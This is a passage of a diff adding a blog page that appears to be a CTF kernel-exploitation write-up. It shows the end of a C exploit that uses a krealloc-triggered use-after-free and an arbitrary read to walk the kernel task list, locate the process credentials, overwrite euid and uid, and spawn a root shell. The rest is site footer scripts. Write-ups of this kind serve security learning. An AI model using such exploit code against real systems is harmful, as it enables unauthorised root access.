+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// krealloc will free manager.recipes_list [krealloc(ptr, 0) = kfree(ptr)]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// we gained UAF on the recipes_list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">alloc_recipe</span>(buf, bufsize, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	ulong current_task <span style="color:#f92672">=</span> INIT_TASK;
+</span></span><span style="display:flex;"><span>	uint pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpid</span>();
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
+</span></span><span style="display:flex;"><span>		uint current_pid <span style="color:#f92672">=</span> (uint)<span style="color:#a6e22e">read_qword</span>(current_task<span style="color:#f92672">+</span>PID_OFF);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(current_pid <span style="color:#f92672">==</span> pid){
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>			current_task <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_qword</span>(current_task<span style="color:#f92672">+</span>NEXT_TASK_OFF)<span style="color:#f92672">-</span>NEXT_TASK_OFF;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leak</span>(<span style="color:#e6db74">&#34;Current task&#34;</span>, current_task);
+</span></span><span style="display:flex;"><span>	ulong creds <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_qword</span>(current_task<span style="color:#f92672">+</span>CREDS_OFF);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">leak</span>(<span style="color:#e6db74">&#34;Creds&#34;</span>, creds);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">change_uid</span>(creds<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>); <span style="color:#75715e">// EUID (effective UID)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">change_uid</span>(creds<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>); <span style="color:#75715e">// current UID
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Note</strong>: first override the <code>euid</code> and then the <code>uid</code>, otherwise you won&rsquo;t be able to change the <code>euid</code>, for some reason.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
